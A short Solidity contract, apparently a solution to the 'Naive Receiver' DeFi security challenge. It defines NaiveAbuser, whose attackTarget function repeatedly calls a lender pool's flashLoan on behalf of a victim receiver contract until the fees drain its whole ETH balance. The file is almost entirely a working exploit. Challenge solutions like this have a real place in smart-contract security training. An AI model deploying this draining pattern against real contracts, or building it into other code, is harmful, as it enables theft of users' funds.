// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

// Our contract to grief NiaveReceiver
contract NaiveAbuser {
  NaiveReceiverLenderPool public pool;
  FlashLoanReceiver public target;
  address public owner;
  address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

  constructor(address payable _target, address payable _pool) {
    pool = NaiveReceiverLenderPool(_pool);
    target = FlashLoanReceiver(_target);
    owner = msg.sender;
  }

  function attackTarget() external {
    require(msg.sender == owner, 'Owner Only');
    // Drain it
    while (address(target).balance > 0) {
      // Just keep getting target charged for flash loans until broke
      pool.flashLoan(target, ETH, 1 ether, "");
    }
  }
}
